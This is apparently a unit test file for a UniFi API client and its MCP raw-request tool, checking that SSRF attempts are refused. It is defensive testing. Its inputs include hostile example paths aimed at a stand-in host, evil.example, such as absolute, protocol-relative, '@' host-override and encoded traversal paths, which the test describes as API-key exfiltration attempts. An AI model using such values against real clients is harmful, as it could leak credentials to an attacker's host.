import { describe, expect, it, vi } from "vitest";
import type { z } from "zod";
import type { McpServer } from "@modelcontextprotocol/server";
import { UnifiClient } from "../../src/client/unifiClient.js";
import { UnifiApiError } from "../../src/client/errors.js";
import { createLogger } from "../../src/utils/logger.js";
import { registerRawRequestTool } from "../../src/tools/rawRequest.js";
import type { ServerContext } from "../../src/server.js";

// Same cfg shape and mockFetch helper as tests/unit/unifiClient.test.ts.
const cfg = {
  apiKey: "k",
  apiBase: "https://api.ui.com",
  confirmWrites: false,
  timeoutMs: 1000,
  logLevel: "error" as const,
};

function mockFetch(impl: (req: { url: string; init: RequestInit }) => Promise<Response>) {
  return vi.fn().mockImplementation((url: string, init: RequestInit = {}) => impl({ url, init }));
}

function okJson() {
  return new Response('{"data":[]}', {
    status: 200,
    headers: { "content-type": "application/json" },
  });
}

describe("SSRF hardening - buildUrl origin allow-list", () => {
  it("THROWS and never calls fetch for an absolute off-origin URL path (X-API-Key exfil blocked)", async () => {
    const f = mockFetch(async () => okJson());
    const c = new UnifiClient(cfg, createLogger("error"), { fetch: f });

    await expect(c.request("GET", "https://evil.example/steal")).rejects.toBeInstanceOf(
      UnifiApiError,
    );

    // Hard proof: the request was refused before any network egress.
    expect(f).toHaveBeenCalledTimes(0);
    expect(f).not.toHaveBeenCalledWith(expect.stringContaining("evil.example"), expect.anything());
  });

  it("THROWS and never calls fetch for a protocol-relative path //evil.example/steal", async () => {
    const f = mockFetch(async () => okJson());
    const c = new UnifiClient(cfg, createLogger("error"), { fetch: f });

    await expect(c.request("GET", "//evil.example/steal")).rejects.toBeInstanceOf(UnifiApiError);

    expect(f).toHaveBeenCalledTimes(0);
    expect(f).not.toHaveBeenCalledWith(expect.stringContaining("evil.example"), expect.anything());
  });

  it("names the refused path in the thrown error message", async () => {
    const f = mockFetch(async () => okJson());
    const c = new UnifiClient(cfg, createLogger("error"), { fetch: f });

    // assertSafePath refuses the path before any URL is built, which is
    // stricter than the origin check alone (audit N-20).
    await expect(c.request("GET", "https://evil.example/steal")).rejects.toThrow(
      /invalid path "https:\/\/evil\.example\/steal"/,
    );
    await expect(c.request("GET", "https://evil.example/steal")).rejects.toMatchObject({
      statusCode: 0,
    });
    expect(f).toHaveBeenCalledTimes(0);
  });

  it("SUCCEEDS for a normal relative path /v1/hosts and calls fetch with the UniFi origin", async () => {
    const f = mockFetch(async () => okJson());
    const c = new UnifiClient(cfg, createLogger("error"), { fetch: f });

    const res = await c.request("GET", "/v1/hosts");
    expect(res.status).toBe(200);
    expect(f).toHaveBeenCalledTimes(1);
    expect(f).toHaveBeenCalledWith(
      "https://api.ui.com/v1/hosts",
      expect.objectContaining({ headers: expect.objectContaining({ "X-API-Key": "k" }) }),
    );
  });

  it("does NOT break the legitimate Network connector path via requestNetwork()", async () => {
    const f = mockFetch(async () => okJson());
    const c = new UnifiClient(cfg, createLogger("error"), { fetch: f });

    await expect(
      c.requestNetwork("GET", "console123", "/firewall/policies"),
    ).resolves.toBeDefined();

    expect(f).toHaveBeenCalledTimes(1);
    const url = String(f.mock.calls[0]?.[0]);
    expect(url).toBe(
      "https://api.ui.com/v1/connector/consoles/console123/proxy/network/integration/firewall/policies",
    );
    // Same-origin: must be the UniFi host, never an attacker host.
    expect(new URL(url).origin).toBe("https://api.ui.com");
  });

  it("does NOT break the explicit connector proxy path via request()", async () => {
    const f = mockFetch(async () => okJson());
    const c = new UnifiClient(cfg, createLogger("error"), { fetch: f });

    await expect(
      c.request("GET", "/v1/connector/consoles/abc/proxy/network/integration/v1/sites"),
    ).resolves.toBeDefined();

    expect(f).toHaveBeenCalledTimes(1);
    const url = String(f.mock.calls[0]?.[0]);
    expect(url).toBe(
      "https://api.ui.com/v1/connector/consoles/abc/proxy/network/integration/v1/sites",
    );
    expect(new URL(url).origin).toBe("https://api.ui.com");
  });
});

describe("SSRF hardening - rawRequest path schema (defense-in-depth)", () => {
  // The real schema registered by src/tools/rawRequest.ts, not a copy of its regex.
  function registeredPathSchema(): z.ZodType {
    let shape: Record<string, z.ZodType> | undefined;
    const server = {
      registerTool: (_name: string, def: { inputSchema: { shape: Record<string, z.ZodType> } }) => {
        shape = def.inputSchema.shape;
      },
    } as unknown as McpServer;
    registerRawRequestTool(server, {} as ServerContext);
    if (!shape?.path) throw new Error("unifi_raw_request did not register a path schema");
    return shape.path;
  }
  const pathSchema = registeredPathSchema();

  it("rejects an absolute https path at the schema level", () => {
    expect(pathSchema.safeParse("https://evil.example/steal").success).toBe(false);
  });

  it("rejects a protocol-relative //evil path at the schema level", () => {
    expect(pathSchema.safeParse("//evil.example/steal").success).toBe(false);
  });

  it.each(["/v1/hosts@evil.example", "/v1/../x", "/v1/%2e%2e/x", "/\\evil.example/"])(
    "rejects host-override or traversal path %s at the schema level",
    (p) => {
      expect(pathSchema.safeParse(p).success).toBe(false);
    },
  );

  it("accepts a normal single-leading-slash path", () => {
    expect(pathSchema.safeParse("/v1/hosts").success).toBe(true);
  });
});
